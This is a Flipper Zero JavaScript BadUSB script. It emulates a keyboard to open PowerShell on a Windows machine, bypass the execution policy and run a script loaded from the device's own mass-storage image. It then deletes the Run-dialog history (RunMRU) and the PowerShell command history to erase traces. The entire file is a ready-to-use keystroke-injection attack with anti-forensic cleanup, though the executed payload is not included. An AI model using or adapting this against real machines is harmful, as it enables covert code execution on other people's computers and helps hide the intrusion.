// PowerShell script name stored in Flipper's mass storage
let pshell = "test.ps1";

// Mass Storage Image path
let image = "/ext/apps_data/mass_storage/Powershell.img";
let size = 8 * 1024 * 1024; // 8MB size

// Required modules
let badusb = require("badusb");
let usbdisk = require("usbdisk");
let storage = require("storage");

// Check for existing mass storage image
if (!storage.fileExists(image)) {
    print("Powershell.img not found. Creating the image...");
    usbdisk.createImage(image, size);
} else {
    print("Storage Exists.");
}

// Set up BadUSB HID with VID/PID
badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfrName: "Flipper", prodName: "Zero" });

// Wait for USB connection
print("Waiting for connection...");
while (!badusb.isConnected()) {
    delay(1000);
}

// Open PowerShell via Run dialog
badusb.press("GUI", "r");
delay(300);
badusb.println("powershell");
badusb.press("ENTER");
delay(2000);

// Execute PowerShell payload from Flipper's mass storage
badusb.println("echo 'Please wait until this window closes to eject the disk!';");
badusb.println("Start-Sleep 6;");
badusb.println("$DriveLetter = (Get-Disk -FriendlyName 'Flipper Mass Storage' | Get-Partition | Get-Volume).DriveLetter;");
badusb.println("$ScriptPath = $DriveLetter + ':\\' + '" + pshell + "';");
badusb.println("Set-ExecutionPolicy Bypass -Scope Process -Force;");
badusb.println(". $ScriptPath;");
badusb.println("reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f;");
badusb.println("Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue;");
badusb.println("exit;");

badusb.press("ENTER");

// Release USB interface to avoid conflicts
badusb.quit();
delay(2000);
print("Running payload...");

// Mount the mass storage
usbdisk.start(image);

// Wait for user to eject the disk
while (!usbdisk.wasEjected()) {
    delay(1000);
}

// Stop mass storage and finish
usbdisk.stop();
print("Done.");
